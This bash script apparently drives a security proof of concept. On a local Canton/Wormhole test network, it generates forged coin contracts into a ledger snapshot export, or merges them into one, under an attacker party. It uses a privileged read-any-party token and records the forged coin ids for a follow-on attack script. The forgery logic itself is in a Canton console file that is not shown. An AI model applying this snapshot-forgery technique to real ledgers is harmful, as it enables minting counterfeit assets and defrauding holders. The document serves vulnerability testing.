#!/usr/bin/env bash
# L5 snapshot forgery (LocalNet only): run console/forge_coin_contract.canton with a Ledger API token for app-provider.
# Usage: forge_coin_contract.sh            generate FORGE_COIN_COUNT invented coins into FORGE_OUTPUT_FILE
#        FORGE_MODE=merge FORGE_MERGE_BASE=<export.gz> FORGE_MERGE_OUTPUT=<out.gz> forge_coin_contract.sh
# Generate mode writes the attacker party and the forged coin ids to $LOCALNET_STATE_DIR/guardian4/forgery.json, which
# snapshot_forgery_poc.sh attack reads.
set -euo pipefail
# shellcheck source=env.sh
source "$(dirname "${BASH_SOURCE[0]}")/env.sh"

readonly FORGERY_STATE="$LOCALNET_STATE_DIR/guardian4/forgery.json"
forge_output_file="${FORGE_OUTPUT_FILE:-$LOCALNET_STATE_DIR/forge/forged-coins.acs.gz}"
mkdir -p "$(dirname "$forge_output_file")"
if [[ -n "${FORGE_MERGE_OUTPUT:-}" ]]; then
  mkdir -p "$(dirname "$FORGE_MERGE_OUTPUT")"
fi

forge_work_dir="$(mktemp -d)"
trap 'rm -rf "$forge_work_dir"' EXIT
# The console reads app-provider's ACS as gg; wormhole-script has CanReadAsAnyParty.
script_user_token="$("$LOCALNET_SCRIPT_DIR/token.sh" "$SCRIPT_USER_ID")"
(umask 077 && sed "s|^    app-provider {|    app-provider {\n      token = \"$script_user_token\"|" \
  "$LOCALNET_SCRIPT_DIR/console/remote-participants.conf" > "$forge_work_dir/console.conf")

GG_PARTY_ID="$(jq -er .partyId "$LOCALNET_STATE_DIR/gg-artifacts.json")" \
NTT_MANAGER_CID="${NTT_MANAGER_CID:-$(jq -er .burnMint.managerCid "$LOCALNET_STATE_DIR/ntt-contracts.json")}" \
FORGE_DAR_DIR="${FORGE_DAR_DIR:-$LOCALNET_STATE_DIR/guardian4/dars}" \
FORGE_OUTPUT_FILE="$forge_output_file" \
CANTON_CONSOLE_CONFIG="$forge_work_dir/console.conf" \
  "$LOCALNET_SCRIPT_DIR/canton_console.sh" "$LOCALNET_SCRIPT_DIR/console/owner_signing_prelude.canton" \
  "$LOCALNET_SCRIPT_DIR/console/forge_coin_contract.canton" > "$forge_work_dir/forge.log" 2>&1 \
  || { grep -E '^FORGE|ERROR' "$forge_work_dir/forge.log" >&2 || true; echo "FAIL: forge_coin_contract.canton failed" >&2; exit 1; }
grep -E '^FORGE|ERROR' "$forge_work_dir/forge.log" || true

if [[ "${FORGE_MODE:-generate}" == generate ]]; then
  grep -qxF "FORGE self-check ok=true file=$forge_output_file" "$forge_work_dir/forge.log" \
    || { echo "FAIL: the forged coins did not pass the self-check" >&2; exit 1; }
  attacker_party="$(sed -nE 's/^FORGE attacker=([^ ]+)$/\1/p' "$forge_work_dir/forge.log")"
  [[ "$attacker_party" =~ ^SnapshotForgeryAttacker::1220[0-9a-f]{64}$ ]] \
    || { echo "FAIL: no attacker party in the console output: $attacker_party" >&2; exit 1; }
  mkdir -p "$(dirname "$FORGERY_STATE")"
  sed -nE 's/^FORGE coin=([^ ]+)$/\1/p' "$forge_work_dir/forge.log" \
    | jq -Rn --arg attacker "$attacker_party" --arg file "$forge_output_file" \
      '{attackerParty: $attacker, forgedCoinsFile: $file, forgedCoinIds: [inputs]}' > "$FORGERY_STATE"
  echo "forgery state: $FORGERY_STATE"
fi
